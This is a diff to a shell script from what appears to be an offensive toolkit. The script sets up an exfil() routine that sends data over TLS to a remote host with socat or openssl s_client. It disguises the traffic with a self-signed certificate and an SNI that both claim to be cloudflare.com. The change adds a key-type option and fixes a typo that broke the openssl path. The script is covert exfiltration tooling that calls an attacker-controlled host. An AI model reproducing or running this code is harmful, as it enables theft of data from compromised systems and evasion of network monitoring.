@@ -5,9 +5,14 @@ source /sf/bin/funcs_rport.sh
 
 sf_rport_load_all || exit
 
+KTYPE="$1"
+[[ -z $KTYPE ]] && {
+        KTYPE=ed25519
+        echo -e "${CDY}WARNING:${CN} Using ${CDR}${KTYPE}${CN}. Try ${CDC}${0##*/} rsa:2048${CN} on older systems."
+}
 pemfn="/tmp/.sf_exfil_ssl.pem"
 [[ ! -f "$pemfn" ]] && {
-    openssl req -subj '/CN=cloudflare.com/O=EL/C=XX' -new -newkey ed25519 -days 3650 -nodes -x509 -keyout - >"$pemfn" 2>/dev/null
+    openssl req -subj '/CN=cloudflare.com/O=EL/C=XX' -new -newkey "${KTYPE}" -days 3650 -nodes -x509 -keyout - >"$pemfn" 2>/dev/null
 }
 
 echo -en "\
@@ -21,7 +26,7 @@ exfil() {
         concmd=\"socat - OPENSSL-CONNECT:${rip}:${rport}\"
         concmd+=\",cert=\$fn,cafile=\$fn,verify=0\"
     }
-    command -v opxenssl &>/dev/null && {
+    command -v openssl &>/dev/null && {
         concmd=\"openssl s_client -connect ${rip}:${rport}\"
         concmd+=\" -servername cloudflare.com -cert \$fn\"
         concmd+=\" -CAfile \$fn -quiet\"
